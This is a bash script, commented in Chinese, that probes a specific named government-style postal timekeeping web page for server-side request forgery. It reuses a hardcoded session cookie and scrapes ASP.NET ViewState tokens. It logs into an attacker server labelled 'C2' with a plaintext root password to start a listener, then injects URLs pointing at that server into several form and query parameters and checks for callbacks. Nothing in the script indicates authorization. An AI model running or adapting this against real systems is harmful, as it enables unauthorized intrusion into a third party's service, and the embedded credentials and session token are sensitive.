#!/bin/bash

COOKIE="ASP.NET_SessionId=omtonrrfveu055ojf1dnmgwx"
BASE_URL="http://vps.vnpost.vn/chamcong/report/inBCC.aspx"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 测试Export功能 - SSRF探测"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 在C2上启动HTTP监听
echo "[*] 在C2服务器启动HTTP服务器..."
sshpass -p '@admin1314@' ssh -o StrictHostKeyChecking=no -p 2233 root@82.29.71.156 \
    "nohup python3 -m http.server 8888 > /tmp/http_server.log 2>&1 &" 2>/dev/null

sleep 2

# 获取ViewState
echo -e "\n[1] 获取ViewState和表单参数..."
initial_page=$(curl -sk "${BASE_URL}?ID=MAU2" -H "Cookie: $COOKIE")
VIEWSTATE=$(echo "$initial_page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
VIEWGEN=$(echo "$initial_page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
EVENTVAL=$(echo "$initial_page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)

echo "ViewState: ${VIEWSTATE:0:50}..."

# 测试正常Export
echo -e "\n[2] 测试正常Export..."
curl -sk "${BASE_URL}?ID=MAU2" \
    -X POST \
    -H "Cookie: $COOKIE" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VIEWGEN" \
    --data-urlencode "__EVENTVALIDATION=$EVENTVAL" \
    --data-urlencode "txtThang=11" \
    --data-urlencode "txtNam=2025" \
    --data-urlencode "btnExport=Export" \
    -o export_normal.response \
    -D export_normal.headers

echo "响应头:"
cat export_normal.headers | head -20
echo ""
echo "响应大小: $(wc -c < export_normal.response) bytes"

# 检查是否返回文件
if grep -qi "application/.*excel\|application/pdf\|attachment" export_normal.headers; then
    echo "✅ 返回了文件 (可能是Excel/PDF)"
fi

# 测试SSRF - ID参数
echo -e "\n[3] 测试SSRF - ID参数指向C2..."
curl -sk "${BASE_URL}?ID=http://82.29.71.156:8888/ssrf_test_id" \
    -H "Cookie: $COOKIE" \
    -o ssrf_id_test.html

sleep 2

# 检查C2是否收到请求
echo "[*] 检查C2服务器日志..."
c2_log=$(sshpass -p '@admin1314@' ssh -o StrictHostKeyChecking=no -p 2233 root@82.29.71.156 \
    "tail -20 /tmp/http_server.log" 2>/dev/null)

if echo "$c2_log" | grep -q "ssrf_test"; then
    echo "✅✅✅ [SSRF确认!] C2收到请求！"
    echo "$c2_log" | grep "ssrf_test"
else
    echo "⚠️  C2未收到请求"
fi

# 测试SSRF - txtThang参数
echo -e "\n[4] 测试其他参数SSRF..."
for param in "txtThang" "txtNam"; do
    echo "测试参数: $param"
    curl -sk "${BASE_URL}?ID=MAU2" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "$param=http://82.29.71.156:8888/ssrf_test_$param" \
        -o /dev/null 2>&1
    sleep 1
done

sleep 2
c2_log=$(sshpass -p '@admin1314@' ssh -o StrictHostKeyChecking=no -p 2233 root@82.29.71.156 \
    "tail -30 /tmp/http_server.log" 2>/dev/null)
echo "C2最新日志:"
echo "$c2_log" | tail -10

echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "SSRF测试完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
